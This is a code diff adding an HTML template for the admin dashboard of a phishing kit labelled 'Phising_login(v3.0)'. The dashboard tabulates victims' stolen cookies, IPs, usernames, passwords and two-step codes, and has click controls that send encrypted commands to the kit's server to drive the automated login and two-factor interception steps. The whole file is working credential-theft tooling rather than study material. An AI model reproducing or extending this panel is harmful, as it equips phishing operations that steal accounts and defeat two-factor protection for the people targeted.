@@ -1,0 +1,59 @@
+<html>
+  <head>
+    <link rel="stylesheet" href="/static/styles/styles_admin.css">
+    <title>Phising_login(v3.0)</title>
+    <script>
+      console.log("run")
+    </script>
+    <script>
+      function ReplaceContent(NC) {
+        document.getElementById('table_container').innerHTML = NC;
+        document.getElementById('table_container').style.display = "block";
+      }
+      var url = "http://{{adress}}/admin?password={{password}}";
+    </script>
+    <script>
+      function get(url) {
+        var arguments = url.split("&");
+        var url = arguments[0];
+        arguments.splice(0, 1);
+        var arguments_string = "";
+        for (var i = 0; i < arguments.length; i++) {
+          arguments_string += arguments[i] + ";";
+        }
+        var token = new fernet.Token({
+          secret: new fernet.Secret(btoa(md5(document.getElementsByTagName('input')[0].value))),
+          ttl: 0
+        })
+        arguments_encrypted = token.encode(arguments_string);
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", url + "&arguments=" + arguments_encrypted, true);
+        xmlHttp.send( null );
+      }
+    </script>
+    <script type="text/javascript" src="/static/scripts/fernetBrowser.js"></script>
+    <script type="text/javascript" src="/static/scripts/reload.js"></script>
+    <script type="text/javascript" src="/static/scripts/md5.min.js"></script>
+  </head>
+  <body>
+    <input style="width: 300px; margin-left: calc(50% - 150px);" type="password" value="" onblur="refresh(this.value);">
+    <span id="table_container" class="table_container">
+      <p style="text-align: center; color: black; font-family: Courier New">{{server_date_time}}</p>
+      <table>
+        <tr>
+          <th><p>cookie</p></th>
+          <th><p>Time</p></th>
+          <th><p>IP</p></th>
+          <th><p>Network</p></th>
+          <th><p>link_name</p></th>
+          <th><p>username</p><div onclick="get('http://{{adress}}/admin?password={{password}}&command=option&step=auto_Pstep2&value={{Rauto_Pstep2}}')" id={{auto_Pstep2}}>{{auto_Pstep2}}</div></th>
+          <th><p>password</p><div onclick="get('http://{{adress}}/admin?password={{password}}&command=option&step=auto_Pstep3&value={{Rauto_Pstep3}}')" id={{auto_Pstep3}}>{{auto_Pstep3}}</div></th>
+          <th><p>Need two-step</p><div onclick="get('http://{{adress}}/admin?password={{password}}&command=option&step=auto_Nstep3&value={{Rauto_Nstep3}}')" id={{auto_Nstep3}}>{{auto_Nstep3}}</div></th>
+          <th><p>two-step</p><div onclick="get('http://{{adress}}/admin?password={{password}}&command=option&step=auto_Pstep4&value={{Rauto_Pstep4}}')" id={{auto_Pstep4}}>{{auto_Pstep4}}</div></th>
+          <th><p>controll</p></th>
+        </tr>
+        {{code | safe}}
+      </table>
+    </span>
+  </body>
+</html>
